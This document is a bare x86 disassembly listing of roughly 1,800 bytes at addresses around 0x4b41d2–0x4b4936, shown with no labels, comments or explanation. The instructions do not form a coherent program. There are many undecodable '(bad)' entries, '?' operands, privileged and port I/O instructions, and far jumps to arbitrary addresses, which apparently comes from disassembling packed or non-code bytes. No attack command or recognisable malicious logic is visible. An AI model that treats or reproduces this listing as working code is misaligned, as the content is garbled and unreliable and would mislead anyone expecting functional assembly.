  4b41d2:	adc    esp,edi
  4b41d4:	sub    eax,0x88d59194
  4b41d9:	dec    esi
  4b41da:	sbb    BYTE PTR [esi],dl
  4b41dc:	add    al,0xba
  4b41df:	aaa    
  4b41e0:	imul   edx,DWORD PTR [edx],0x39864614
  4b41e6:	rcr    DWORD PTR [esi+0x16],0x4c
  4b41ea:	fs cmp al,0x1c
  4b41ed:	push   edx
  4b41ee:	mov    ?,esp
  4b41f0:	mov    esp,0xa9d5f0a1
  4b41f5:	mov    ecx,DWORD PTR ss:[edx]
  4b41f8:	mov    ecx,0x28d86857
  4b41fd:	fwait
  4b41fe:	ret    0xc13
  4b4201:	add    BYTE PTR [edx],al
  4b4203:	data16 sbb ch,BYTE PTR [eax-0x24]
  4b4207:	add    esp,DWORD PTR [ebx]
  4b4209:	push   0xc
  4b420b:	imul   esi,DWORD PTR [ecx],0x9c488380
  4b4211:	push   edx
  4b4212:	and    bl,dl
  4b4214:	jo     0x4b41c0
  4b4216:	xchg   ecx,eax
  4b4217:	mov    esp,DWORD PTR [ecx]
  4b4219:	xor    al,0xe0
  4b421b:	popf   
  4b421c:	push   ss
  4b421d:	xchg   esp,eax
  4b421e:	jecxz  0x4b424d
  4b4220:	or     edi,DWORD PTR [esi]
  4b4222:	push   0xea86c184
  4b4227:	sbb    DWORD PTR [ecx],eax
  4b4229:	jns    0x4b424b
  4b422b:	pop    ds
  4b422c:	icebp  
  4b422d:	sub    BYTE PTR [edx+edx*2-0x4a32ddce],al
  4b4234:	xor    BYTE PTR [ebx],bh
  4b4236:	adc    al,al
  4b4238:	cdq    
  4b4239:	nop
  4b423a:	fld    DWORD PTR ds:0x2c8502a5
  4b4240:	call   0x24858677
  4b4245:	xchg   sp,ax
  4b4247:	mov    ebx,ds
  4b4249:	and    ebp,edi
  4b424b:	shr    BYTE PTR [eax-0x24],1
  4b424e:	lods   al,BYTE PTR ds:[esi]
  4b424f:	push   0x5ca508f4
  4b4254:	push   ss
  4b4255:	mov    eax,0x8483e66a
  4b425a:	mov    esi,DWORD PTR [edi]
  4b425c:	lea    ecx,[esi-0x4a]
  4b425f:	arpl   ax,di
  4b4261:	addr16 xor ch,ah
  4b4264:	mov    es,WORD PTR [edx+0x4dbc049f]
  4b426a:	push   0x4399a09f
  4b426f:	add    DWORD PTR [si-0x26],eax
  4b4273:	push   ds
  4b4274:	push   esi
  4b4275:	sub    BYTE PTR [esi+0x37],dh
  4b4278:	inc    esi
  4b4279:	inc    ebx
  4b427a:	lds    edi,FWORD PTR [ebx]
  4b427c:	push   esi
  4b427d:	cmp    BYTE PTR [edx+0x26],dl
  4b4280:	sbb    BYTE PTR cs:[eax-0x46],bl
  4b4284:	xor    al,0x23
  4b4286:	dec    esp
  4b4287:	inc    eax
  4b4288:	sbb    ah,dl
  4b428a:	inc    ebx
  4b428b:	xchg   edx,eax
  4b428c:	adc    al,0x3e
  4b428e:	push   ds
  4b428f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b4290:	icebp  
  4b4291:	cdq    
  4b4292:	out    dx,al
  4b4293:	iret   
  4b4294:	ins    BYTE PTR es:[edi],dx
  4b4295:	bound  edx,QWORD PTR [ecx+0x305041c]
  4b429b:	aaa    
  4b429c:	enter  0x714,0x28
  4b42a0:	add    BYTE PTR [esi+0x7c1cc29],ch
  4b42a6:	retf   0xa92c
  4b42a9:	sub    al,0xd7
  4b42ab:	or     DWORD PTR [esi],esp
  4b42ad:	xchg   BYTE PTR [esi],al
  4b42af:	mov    eax,0xa9554c6
  4b42b4:	or     al,0x6a
  4b42b6:	or     edi,edi
  4b42b8:	push   eax
  4b42b9:	aaa    
  4b42ba:	inc    ecx
  4b42bb:	add    bl,BYTE PTR [ecx]
  4b42bd:	iret   
  4b42be:	xchg   ecx,eax
  4b42bf:	cmp    BYTE PTR [eax],ah
  4b42c1:	push   esi
  4b42c2:	(bad)  
  4b42c3:	popa   
  4b42c4:	dec    eax
  4b42c5:	sub    al,bl
  4b42c7:	test   ebx,ebx
  4b42c9:	je     0x4b4340
  4b42cb:	out    0x83,eax
  4b42cd:	cmp    eax,0x7912dacb
  4b42d2:	and    dl,BYTE PTR [ebp-0x23c92460]
  4b42d8:	add    esp,DWORD PTR [ebx+edx*2-0x2934c075]
  4b42df:	adc    DWORD PTR [esi],eax
  4b42e1:	push   cs
  4b42e2:	mov    esp,0x648c570f
  4b42e7:	bound  esp,QWORD PTR [edi]
  4b42e9:	add    eax,DWORD PTR [eax]
  4b42eb:	jae    0x4b4344
  4b42ed:	std    
  4b42ee:	imul   ebx,DWORD PTR [ecx+0x9],0xffffff97
  4b42f2:	or     al,0x8d
  4b42f4:	pop    esi
  4b42f5:	or     BYTE PTR [ebx-0x78],dl
  4b42f8:	mov    al,0xa8
  4b42fa:	gs mov ecx,0x3918e42a
  4b4300:	popa   
  4b4301:	ret    0xde00
  4b4304:	call   0xa1c2ec11
  4b4309:	arpl   di,ax
  4b430b:	or     BYTE PTR [ecx+0x26],dl
  4b430e:	ret    0xcb21
  4b4311:	rcr    BYTE PTR [ebx+0x1a],cl
  4b4314:	shr    BYTE PTR [eax+0x5d0c06a4],1
  4b431a:	or     bl,BYTE PTR [eax+0x9]
  4b431d:	rcr    BYTE PTR [ecx-0x19],1
  4b4320:	pop    es
  4b4321:	sub    al,0xbd
  4b4323:	and    DWORD PTR [ebx+0x6832ce7d],ecx
  4b4329:	push   es
  4b432a:	sbb    BYTE PTR [eax],bh
  4b432c:	or     DWORD PTR [edx+0x3b],edx
  4b432f:	mov    BYTE PTR [ebx],dl
  4b4331:	pop    eax
  4b4332:	rcr    BYTE PTR [edx+ecx*2],0xe0
  4b4336:	pop    esi
  4b4337:	xchg   DWORD PTR [eax-0x6f],esp
  4b433a:	test   eax,0x10714605
  4b433f:	adc    al,0xc4
  4b4341:	or     DWORD PTR [edx-0x770a3b0a],0x7799daec
  4b434b:	ds push edi
  4b434d:	and    eax,0xc7f5a83c
  4b4352:	fs sbb DWORD PTR ss:[edx-0x2b9efabe],eax
  4b435a:	sbb    DWORD PTR [edi-0x5c3c12d5],edi
  4b4360:	mov    ah,0x44
  4b4362:	inc    ebx
  4b4363:	adc    BYTE PTR [eax-0x76],cl
  4b4366:	and    al,0x74
  4b4368:	xor    al,0xf7
  4b436a:	mov    ch,0xb7
  4b436c:	std    
  4b436d:	dec    eax
  4b436e:	je     0x4b438a
  4b4370:	dec    eax
  4b4371:	jne    0x4b43bf
  4b4373:	push   ds
  4b4374:	adc    al,0x50
  4b4376:	jge    0x4b4347
  4b4378:	aaa    
  4b4379:	jmp    0x4b43ab
  4b437b:	sub    eax,0x8324d97d
  4b4380:	and    edi,DWORD PTR [eax]
  4b4382:	and    al,0xb9
  4b4384:	and    bl,ch
  4b4386:	sbb    DWORD PTR [ebx*8+0x4bbe01be],ebp
  4b438d:	popa   
  4b438e:	push   ecx
  4b438f:	pop    ds
  4b4390:	sub    al,0x18
  4b4392:	cmp    DWORD PTR [edi],0x33
  4b4395:	sub    bl,BYTE PTR [eax]
  4b4397:	jne    0x4b43c8
  4b4399:	lea    edi,[esi]
  4b439b:	sbb    BYTE PTR ds:0xa8688f9b,al
  4b43a1:	add    al,0x57
  4b43a3:	xor    BYTE PTR [eax],dh
  4b43a5:	lods   al,BYTE PTR ds:[esi]
  4b43a6:	(bad)  
  4b43a7:	or     BYTE PTR ss:[ebp+0x39532002],bl
  4b43ae:	fdiv   DWORD PTR [esi+esi*2+0x71]
  4b43b2:	xor    al,0x7c
  4b43b4:	clc    
  4b43b5:	rcl    BYTE PTR [eax+0x3a],cl
  4b43b8:	inc    eax
  4b43b9:	adc    al,0x9
  4b43bb:	jae    0x4b43f1
  4b43bd:	or     ecx,DWORD PTR [ebx]
  4b43bf:	mov    eax,0xb6fb8097
  4b43c4:	sbb    esi,DWORD PTR [ecx-0x10778673]
  4b43ca:	push   0xffffffbb
  4b43cc:	xor    eax,0x22fb2c56
  4b43d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b43d2:	add    BYTE PTR [esp+edi*4],al
  4b43d5:	jnp    0x4b4388
  4b43d7:	fyl2xp1 
  4b43d9:	push   edi
  4b43da:	icebp  
  4b43db:	je     0x4b43e1
  4b43dd:	loopne 0x4b43c8
  4b43df:	pusha  
  4b43e0:	mov    eax,0x7d6721eb
  4b43e5:	not    DWORD PTR [eax]
  4b43e7:	je     0x4b4437
  4b43e9:	lea    ecx,[eax-0x2d]
  4b43ec:	sbb    al,0xed
  4b43ee:	dec    eax
  4b43ef:	test   DWORD PTR [eax+edx*2+0x78],0x42d5a5a0
  4b43f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b43f8:	(bad)  
  4b43f9:	xor    BYTE PTR [eax-0x3dc43998],0xfa
  4b4400:	or     esi,DWORD PTR [edi+0x494af9f7]
  4b4406:	inc    esp
  4b4407:	add    DWORD PTR [esi+0x45],eax
  4b440a:	ss test eax,0x3b800780
  4b4410:	out    dx,eax
  4b4411:	mov    al,ds:0xdca370e6
  4b4416:	pusha  
  4b4417:	sub    dh,BYTE PTR [esi-0x456241ee]
  4b441d:	dec    edx
  4b441e:	jns    0x4b442d
  4b4420:	cmp    DWORD PTR [ebx+0x3b5b3ad4],edx
  4b4426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b4427:	fs (bad) 
  4b4429:	ins    BYTE PTR es:[edi],dx
  4b442a:	sbb    DWORD PTR [esi],ebp
  4b442c:	add    bl,BYTE PTR [esi-0x27749b6a]
  4b4432:	add    dl,BYTE PTR es:[ebx]
  4b4435:	retf   
  4b4436:	sar    dh,0x89
  4b4439:	test   BYTE PTR [ebx],ch
  4b443b:	cli    
  4b443c:	cmp    DWORD PTR [ebx+0x310433dc],edi
  4b4442:	nop
  4b4443:	mov    dh,0x18
  4b4445:	sahf   
  4b4446:	sub    edx,ecx
  4b4448:	xchg   esi,eax
  4b4449:	loopne 0x4b4466
  4b444b:	inc    esp
  4b444c:	dec    ecx
  4b444d:	rcr    esp,1
  4b444f:	and    dl,ch
  4b4451:	push   eax
  4b4452:	adc    eax,0x979fd9ff
  4b4457:	mov    eax,ds:0x3b0b1d83
  4b445c:	or     esp,0x49
  4b445f:	mov    ecx,0x41bd7288
  4b4464:	xor    ah,BYTE PTR [edi]
  4b4466:	sbb    al,0xce
  4b4468:	mov    ebp,esp
  4b446a:	add    ah,bh
  4b446c:	adc    al,0xa5
  4b446e:	ss push edx
  4b4470:	in     al,0x77
  4b4472:	inc    ebx
  4b4473:	add    esp,DWORD PTR [edi+0x38044985]
  4b4479:	inc    edx
  4b447a:	cmp    ah,dl
  4b447c:	add    al,0xe9
  4b447e:	push   es
  4b447f:	add    BYTE PTR [edi],dl
  4b4481:	xor    BYTE PTR cs:[edx+0x3b],al
  4b4485:	lods   eax,DWORD PTR ds:[esi]
  4b4486:	jecxz  0x4b44a2
  4b4488:	jbe    0x4b4496
  4b448a:	jp     0x4b44bf
  4b448c:	jmp    DWORD PTR [ebx+0x29]
  4b448f:	adc    eax,0x742ed43b
  4b4494:	sbb    BYTE PTR [ebx+edi*1+0x6fba122b],al
  4b449b:	arpl   di,bx
  4b449d:	and    DWORD PTR [edi-0x15],eax
  4b44a0:	int3   
  4b44a1:	adc    al,0x87
  4b44a3:	popa   
  4b44a4:	or     al,0xe
  4b44a6:	loope  0x4b449d
  4b44a8:	inc    ebp
  4b44a9:	cmp    dl,bl
  4b44ab:	pop    edx
  4b44ac:	mov    ah,0xcb
  4b44ae:	loop   0x4b44c8
  4b44b0:	popa   
  4b44b1:	and    bh,bh
  4b44b3:	jne    0x4b4519
  4b44b5:	inc    edx
  4b44b6:	inc    eax
  4b44b7:	adc    BYTE PTR [esi+0x215450e1],bh
  4b44bd:	and    BYTE PTR [edi+ebx*8-0x3dfde5b0],al
  4b44c4:	mov    esp,ebx
  4b44c6:	push   ecx
  4b44c7:	add    eax,0x1192fc7
  4b44cc:	jle    0x4b4548
  4b44ce:	test   BYTE PTR [ebx+0x48],bl
  4b44d1:	sti    
  4b44d2:	jmp    0xc5ad:0xb7df1b75
  4b44d9:	pop    esi
  4b44da:	and    ch,cl
  4b44dc:	mov    ebx,esi
  4b44de:	das    
  4b44df:	inc    edx
  4b44e0:	cmp    cl,BYTE PTR [ecx-0x1e]
  4b44e3:	push   ds
  4b44e4:	inc    ebp
  4b44e5:	push   0x4e
  4b44e7:	and    al,0xfd
  4b44e9:	arpl   WORD PTR [ebx+0x25],dx
  4b44ec:	add    dh,bh
  4b44ee:	push   edx
  4b44ef:	pop    gs
  4b44f1:	sub    BYTE PTR [ebp-0x503e4b19],0x41
  4b44f8:	scas   al,BYTE PTR es:[edi]
  4b44f9:	bound  ebx,QWORD PTR [edx-0x1f]
  4b44fc:	push   edi
  4b44fd:	inc    ecx
  4b44fe:	adc    BYTE PTR [esi+0x8454d90],al
  4b4504:	lea    esp,[ebp-0x73]
  4b4507:	gs mov esi,0x9154e848
  4b450d:	ja     0x4b44fa
  4b450f:	pop    ss
  4b4510:	xchg   ecx,eax
  4b4511:	inc    ebx
  4b4512:	push   eax
  4b4513:	call   0x3eeb:0x4ce09949
  4b451a:	xchg   esp,eax
  4b451b:	int3   
  4b451c:	fiadd  DWORD PTR [ecx]
  4b451e:	stc    
  4b451f:	and    esp,DWORD PTR [eax]
  4b4521:	rcl    BYTE PTR [esi+0x525914a0],0x50
  4b4528:	push   0xb56b6588
  4b452d:	lsl    eax,dx
  4b4530:	shl    BYTE PTR [ecx],0xf5
  4b4533:	adc    al,0x30
  4b4535:	test   BYTE PTR [ebx-0x30741689],cl
  4b453b:	loope  0x4b44c9
  4b453d:	add    DWORD PTR [eax-0xfc482c1],0x76
  4b4544:	add    al,BYTE PTR [esi]
  4b4546:	push   es
  4b4547:	mov    DWORD PTR [eax-0x4e],edi
  4b454a:	xchg   esi,eax
  4b454b:	sar    BYTE PTR [ecx+ecx*4],1
  4b454e:	mov    ch,0x89
  4b4550:	sbb    edx,0x5e
  4b4553:	(bad)  
  4b4554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b4555:	add    BYTE PTR [ecx],0x69
  4b4558:	jmp    FWORD PTR [esi+eax*1+0x4]
  4b455c:	popa   
  4b455d:	mov    eax,edi
  4b455f:	mov    esi,eax
  4b4561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b4562:	and    DWORD PTR [ecx-0x3e],esi
  4b4565:	jnp    0x4b4542
  4b4567:	or     BYTE PTR ss:[edi],0x28
  4b456b:	mov    bl,0x54
  4b456d:	push   ax
  4b456f:	sbb    BYTE PTR [esi+edi*1+0x1f86893d],0x22
  4b4577:	cmp    esp,DWORD PTR [ecx-0x40]
  4b457a:	stos   DWORD PTR es:[edi],eax
  4b457b:	xor    al,0x57
  4b457d:	push   eax
  4b457e:	mov    eax,ds:0x83021897
  4b4583:	cmp    DWORD PTR [eax+esi*2-0x54a2dbc1],edx
  4b458a:	mov    edx,DWORD PTR [esi-0x2c6ae0e7]
  4b4590:	xchg   dl,dl
  4b4592:	cld    
  4b4593:	fisttp QWORD PTR [ecx-0x5a2a3642]
  4b4599:	cmp    eax,0x32fa6061
  4b459e:	popf   
  4b459f:	mov    dh,0x40
  4b45a1:	dec    edi
  4b45a2:	or     al,0x4
  4b45a4:	aad    0x9e
  4b45a6:	pop    ebx
  4b45a7:	inc    esp
  4b45a8:	test   al,0x8a
  4b45aa:	aaa    
  4b45ab:	xchg   BYTE PTR [ecx+0x480108c7],al
  4b45b1:	inc    edi
  4b45b2:	popa   
  4b45b3:	hlt    
  4b45b4:	xchg   esp,eax
  4b45b5:	inc    eax
  4b45b6:	pop    ds
  4b45b7:	into   
  4b45b8:	fs push es
  4b45ba:	push   es
  4b45bb:	push   edx
  4b45bc:	loop   0x4b4626
  4b45be:	mov    al,ds:0x6ab53050
  4b45c3:	inc    esp
  4b45c4:	add    al,BYTE PTR fs:[ecx-0x7fffb646]
  4b45cb:	mov    ah,0x14
  4b45cd:	cdq    
  4b45ce:	lds    esp,FWORD PTR ds:0x3ac0f646
  4b45d4:	not    DWORD PTR [ebx+0x2c]
  4b45d7:	or     al,BYTE PTR [ebx-0x485a4fcf]
  4b45dd:	push   es
  4b45de:	xor    al,dl
  4b45e0:	sbb    al,0xe8
  4b45e2:	or     BYTE PTR [eax+0x3c085d7c],0x20
  4b45e9:	rol    ebp,0x2f
  4b45ec:	or     al,0x77
  4b45ee:	xor    al,0x51
  4b45f0:	xor    DWORD PTR [eax],0xffffff82
  4b45f3:	push   ss
  4b45f4:	addr16 sahf 
  4b45f6:	jno    0x4b4590
  4b45f8:	test   DWORD PTR [eax+0x208726d6],ecx
  4b45fe:	and    al,0xf0
  4b4600:	add    ecx,DWORD PTR [ecx]
  4b4602:	push   0xc47e8d26
  4b4607:	and    dl,BYTE PTR [eax]
  4b4609:	pop    edi
  4b460a:	jbe    0x4b462b
  4b460c:	dec    esp
  4b460d:	jl     0x4b4637
  4b460f:	retf   0x8601
  4b4612:	mov    BYTE PTR ds:0x6808ee4f,bh
  4b4618:	arpl   WORD PTR [ecx+0x4e5f008],sp
  4b461e:	fdiv   QWORD PTR [ebx+edi*2]
  4b4621:	inc    esp
  4b4622:	cld    
  4b4623:	sbb    ecx,DWORD PTR [esi+0x118e0fc6]
  4b4629:	mov    edi,DWORD PTR es:[eax]
  4b462c:	sbb    edx,DWORD PTR ds:0xcaa69d4d
  4b4632:	add    eax,DWORD PTR [eax-0x50]
  4b4635:	mov    eax,0xf736ada6
  4b463a:	or     BYTE PTR [edx],cl
  4b463c:	hlt    
  4b463d:	adc    BYTE PTR [edx+0x2c],0x9c
  4b4641:	jg     0x4b4693
  4b4643:	fistp  QWORD PTR [ebx+0x70]
  4b4646:	popf   
  4b4647:	ss cmp dl,bl
  4b464a:	xor    bl,BYTE PTR [ecx]
  4b464c:	or     ecx,DWORD PTR [ebx+0x0]
  4b464f:	clc    
  4b4650:	shl    BYTE PTR ds:0x1e45e818,0x9a
  4b4657:	add    dl,BYTE PTR [eax+esi*1-0x65447eb0]
  4b465e:	mov    edx,0x3044b023
  4b4663:	xchg   ebp,eax
  4b4664:	sbb    BYTE PTR [ebp-0x58eef075],al
  4b466a:	xchg   edi,eax
  4b466b:	cwde   
  4b466c:	xchg   ebx,eax
  4b466d:	cmp    DWORD PTR [eax],eax
  4b466f:	push   cs
  4b4670:	xor    BYTE PTR [esi],ch
  4b4672:	scas   eax,DWORD PTR es:[edi]
  4b4673:	jge    0x4b4691
  4b4675:	popf   
  4b4676:	jne    0x4b46c4
  4b4678:	fld    TBYTE PTR [eax+0x3d]
  4b467b:	jnp    0x4b468d
  4b467d:	je     0x4b460f
  4b467f:	shl    DWORD PTR [edi+edi*2],1
  4b4682:	les    ebp,FWORD PTR [ebp+0x49]
  4b4685:	in     al,dx
  4b4686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b4687:	add    DWORD PTR [ecx+esi*1],esp
  4b468a:	or     al,0x51
  4b468c:	xchg   DWORD PTR [eax],esi
  4b468e:	xor    BYTE PTR [ebx+0x40c35613],dh
  4b4694:	xchg   edi,eax
  4b4695:	add    bl,BYTE PTR cs:[edx]
  4b4698:	cmp    al,0x42
  4b469a:	mul    eax
  4b469c:	jge    0x4b46be
  4b469e:	jo     0x4b46a0
  4b46a0:	jbe    0x4b46dd
  4b46a2:	jge    0x4b471f
  4b46a4:	push   esi
  4b46a5:	sbb    DWORD PTR [eax],0xffffff87
  4b46a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b46a9:	pusha  
  4b46aa:	xor    bl,cl
  4b46ac:	push   ds
  4b46ad:	lods   al,BYTE PTR ds:[esi]
  4b46ae:	xchg   esp,eax
  4b46af:	rcr    DWORD PTR [ecx+0x46],0x27
  4b46b3:	xchg   DWORD PTR [ecx+eax*4+0x1585276f],edx
  4b46ba:	das    
  4b46bb:	mov    ds:0xf1014a61,eax
  4b46c0:	shl    BYTE PTR [ebx],cl
  4b46c2:	push   ecx
  4b46c3:	test   BYTE PTR [edx+0x17c1400c],ah
  4b46c9:	pop    ss
  4b46ca:	sub    dh,dh
  4b46cc:	push   ecx
  4b46cd:	adc    BYTE PTR [esp+ebx*2+0x55],dh
  4b46d1:	mov    ebp,0xd1f8394a
  4b46d6:	mov    ah,0x34
  4b46d8:	lea    ecx,[ebp+0x749a09bc]
  4b46de:	loopne 0x4b4683
  4b46e0:	je     0x4b46fa
  4b46e2:	xor    bl,BYTE PTR [eax+edi*1]
  4b46e5:	mov    al,ds:0x7b9eb39c
  4b46ea:	sbb    BYTE PTR [edx],al
  4b46ec:	cmp    esp,ebx
  4b46ee:	adc    DWORD PTR [edi+ebx*8],ecx
  4b46f1:	sbb    DWORD PTR [ebp*8+0x2754a209],edi
  4b46f8:	jo     0x4b46a8
  4b46fa:	push   eax
  4b46fb:	cmp    DWORD PTR [edi],ebp
  4b46fd:	mov    BYTE PTR [esi],al
  4b46ff:	or     ecx,DWORD PTR [ecx+0x6a]
  4b4702:	popa   
  4b4703:	mov    dh,BYTE PTR [ebx+0x107523d8]
  4b4709:	inc    edx
  4b470a:	push   edi
  4b470b:	test   al,0xd0
  4b470d:	test   BYTE PTR [edi+0x3700695],al
  4b4713:	xchg   ecx,eax
  4b4714:	add    BYTE PTR [ebx-0x73fbe47e],ch
  4b471a:	daa    
  4b471b:	(bad)  
  4b471c:	in     al,dx
  4b471d:	push   es
  4b471e:	add    ebx,eax
  4b4720:	js     0x4b46b1
  4b4722:	aaa    
  4b4723:	xor    eax,DWORD PTR [edi-0x16c714f4]
  4b4729:	inc    eax
  4b472a:	inc    esi
  4b472b:	jge    0x4b46cd
  4b472d:	pop    ecx
  4b472e:	push   es
  4b472f:	mov    ebx,DWORD PTR [ebx+edi*1-0x764d7d10]
  4b4736:	lock jne 0x4b473a
  4b4739:	inc    edi
  4b473a:	inc    esi
  4b473b:	and    al,0x22
  4b473d:	xchg   ebx,eax
  4b473e:	loopne 0x4b472f
  4b4740:	jnp    0x4b4746
  4b4742:	daa    
  4b4743:	inc    eax
  4b4744:	and    ebx,DWORD PTR [edi]
  4b4746:	adc    ah,BYTE PTR [eax+eiz*1+0x1139cc2b]
  4b474d:	retf   
  4b474e:	in     al,dx
  4b474f:	or     DWORD PTR [ebx-0x4bfdcec0],0x4215055d
  4b4759:	sub    edi,DWORD PTR [edx+0x31e89339]
  4b475f:	cmp    eax,0x1a37511c
  4b4764:	xor    al,0x8b
  4b4766:	test   BYTE PTR [edi-0x6c],bl
  4b4769:	loop   0x4b4754
  4b476b:	push   ss
  4b476c:	xchg   ecx,eax
  4b476d:	in     al,dx
  4b476e:	stc    
  4b476f:	pcmpgtd mm6,QWORD PTR [eax+0x6b]
  4b4773:	adc    bl,BYTE PTR [ebp-0x6dfb2691]
  4b4779:	retf   
  4b477a:	sbb    esp,0xbc340479
  4b4780:	mov    cl,BYTE PTR [esi+0x11]
  4b4783:	xchg   BYTE PTR [edx],al
  4b4785:	fdivp  st(6),st
  4b4787:	push   edi
  4b4788:	js     0x4b4795
  4b478a:	sbb    al,0x42
  4b478c:	(bad)  
  4b478d:	das    
  4b478e:	xor    dl,BYTE PTR [edx+ebp*1]
  4b4791:	ret    0x686
  4b4794:	ret    
  4b4795:	sbb    DWORD PTR [edi+0x240358b9],0xffffffbc
  4b479c:	push   es
  4b479d:	cmp    dl,BYTE PTR ds:0x165df33a
  4b47a3:	xor    eax,0x4619ea58
  4b47a8:	add    BYTE PTR [ecx-0x1f],dl
  4b47ab:	and    BYTE PTR [ebx-0x80],dh
  4b47ae:	pop    ebx
  4b47af:	mov    esi,0x4800c7fa
  4b47b4:	int3   
  4b47b5:	inc    ebx
  4b47b6:	add    ah,BYTE PTR [esi+ebp*4+0x2ad6758d]
  4b47bd:	sbb    DWORD PTR [eax+0x0],ebx
  4b47c0:	inc    ebx
  4b47c1:	in     eax,0x25
  4b47c3:	jl     0x4b478e
  4b47c5:	inc    eax
  4b47c6:	arpl   WORD PTR [ecx-0x6],ax
  4b47c9:	sbb    al,0x83
  4b47cb:	push   ecx
  4b47cc:	or     al,0x39
  4b47ce:	pop    es
  4b47cf:	pop    esp
  4b47d0:	xchg   edx,eax
  4b47d1:	add    BYTE PTR [ebx],0x97
  4b47d4:	add    DWORD PTR [edx],0xc6c49484
  4b47da:	jae    0x4b4816
  4b47dc:	mov    al,0x26
  4b47de:	sub    esi,ebp
  4b47e0:	push   ebx
  4b47e1:	cmp    ch,BYTE PTR [ebx+edi*1-0x77d86473]
  4b47e8:	retf   0x5d5d
  4b47eb:	sbb    BYTE PTR [edi-0x7b],dh
  4b47ee:	adc    DWORD PTR [edx-0x2bac1372],edx
  4b47f4:	shr    BYTE PTR [edx+0x21],cl
  4b47f7:	mov    WORD PTR [edi+edx*1+0x65],es
  4b47fb:	mov    edx,DWORD PTR [edx-0x3e14b7e2]
  4b4801:	cmp    eax,eax
  4b4803:	pop    es
  4b4804:	test   BYTE PTR [ecx-0x3560dc91],ch
  4b480a:	rcr    BYTE PTR [esi-0x28],0x2a
  4b480e:	push   esi
  4b480f:	push   edx
  4b4810:	stos   DWORD PTR es:[edi],eax
  4b4811:	sbb    dh,ch
  4b4813:	xor    DWORD PTR [ecx+0x5b090e95],ecx
  4b4819:	test   DWORD PTR [edi+ebp*1],edx
  4b481c:	xor    eax,ebx
  4b481e:	and    BYTE PTR [ecx],cl
  4b4820:	dec    esi
  4b4821:	mov    DWORD PTR [edi],esi
  4b4823:	cld    
  4b4824:	rcr    BYTE PTR ds:0x124d94ab,0x7
  4b482b:	ja     0x4b4881
  4b482d:	push   edi
  4b482e:	call   0x3c30:0x39b88e08
  4b4835:	inc    ebx
  4b4836:	arpl   WORD PTR [ebp-0x5ff1fb7e],ax
  4b483c:	adc    al,0xb3
  4b483e:	es inc ecx
  4b4840:	cs sar esi,1
  4b4843:	cmp    esp,DWORD PTR [edx-0x4]
  4b4846:	ss dec edi
  4b4848:	push   eax
  4b4849:	(bad)  
  4b484a:	(bad)
  4b484e:	add    eax,0x5a96f5c
  4b4853:	xchg   DWORD PTR [edi],eax
  4b4855:	fist   DWORD PTR [edi+ecx*1+0x50ebb976]
  4b485d:	lock sub eax,0x7ff07e3
  4b4863:	std    
  4b4864:	sub    eax,0x893b0782
  4b4869:	jae    0x4b4871
  4b486b:	jmp    0x4b484f
  4b486d:	sub    al,0x3f
  4b486f:	test   al,0x5
  4b4871:	retf   
  4b4872:	mov    al,0x1
  4b4874:	cmp    eax,0xf03288b7
  4b4879:	push   eax
  4b487a:	xchg   ebx,eax
  4b487b:	or     dl,ah
  4b487d:	test   DWORD PTR [ebp+eiz*2-0x37],edi
  4b4881:	lea    eax,[ebp-0x4b]
  4b4884:	cli    
  4b4885:	and    ecx,DWORD PTR [ecx+0x2de3d85c]
  4b488b:	push   esi
  4b488c:	fs inc eax
  4b488e:	dec    esp
  4b488f:	jl     0x4b48f8
  4b4891:	cmp    ebx,eax
  4b4893:	jge    0x4b48f8
  4b4895:	enter  0x76c2,0x75
  4b4899:	(bad)  
  4b489a:	pop    ss
  4b489b:	xchg   ebp,eax
  4b489c:	pop    ecx
  4b489d:	push   edx
  4b489e:	loope  0x4b48fe
  4b48a0:	mov    WORD PTR [ebx+0xd2c22b4],?
  4b48a6:	pop    ebx
  4b48a7:	inc    ebp
  4b48a8:	lea    edi,[edx+eiz*8+0x6b]
  4b48ac:	mov    ebx,0x55566c16
  4b48b1:	mov    bl,0xd8
  4b48b3:	and    edi,DWORD PTR [ecx+0x2d9d1a4b]
  4b48b9:	fstp   TBYTE PTR [ebp+0x6e96b0e3]
  4b48bf:	pusha  
  4b48c0:	cmp    al,0xf9
  4b48c2:	sub    ecx,DWORD PTR [edx-0x59]
  4b48c5:	sar    DWORD PTR [edx],0x17
  4b48c8:	pop    edi
  4b48c9:	mov    al,0x13
  4b48cb:	xchg   ebp,eax
  4b48cc:	or     al,0x9c
  4b48ce:	sbb    eax,0x540f5485
  4b48d3:	dec    ebp
  4b48d4:	xor    dh,BYTE PTR [edx]
  4b48d6:	and    al,bl
  4b48d8:	push   esp
  4b48d9:	or     al,0x76
  4b48db:	push   es
  4b48dc:	sbb    al,0x84
  4b48de:	dec    esp
  4b48df:	add    al,0xa0
  4b48e1:	das    
  4b48e2:	mov    dl,0x37
  4b48e4:	add    eax,edx
  4b48e6:	aaa    
  4b48e7:	dec    ebp
  4b48e8:	fcom   DWORD PTR [edx]
  4b48ea:	dec    esp
  4b48eb:	test   al,0x68
  4b48ed:	cmp    eax,0xc8ab1068
  4b48f2:	or     eax,0xc505f130
  4b48f7:	push   cs
  4b48f8:	push   ebx
  4b48f9:	into   
  4b48fa:	ds xor bl,0x82
  4b48fe:	and    edi,esp
  4b4900:	push   esp
  4b4901:	neg    esp
  4b4903:	loopne 0x4b4908
  4b4905:	or     ebp,DWORD PTR [esi-0x5]
  4b4908:	push   eax
  4b4909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b490a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b490b:	and    DWORD PTR ds:0xaca4992b,ebx
  4b4911:	push   esp
  4b4912:	push   esp
  4b4913:	or     DWORD PTR [eax+0x3fb60ab0],esp
  4b4919:	shl    DWORD PTR [ebp-0x7aa28ef0],0x10
  4b4920:	xchg   BYTE PTR [ecx-0x69c3b1d9],al
  4b4926:	and    esp,DWORD PTR [ebx]
  4b4928:	jne    0x4b494a
  4b492a:	adc    bl,BYTE PTR [bx+si]
  4b492d:	mov    eax,0xf60c235b
  4b4932:	pop    eax
  4b4933:	xchg   BYTE PTR [eax+0x5e],ch
  4b4936:	(bad)  
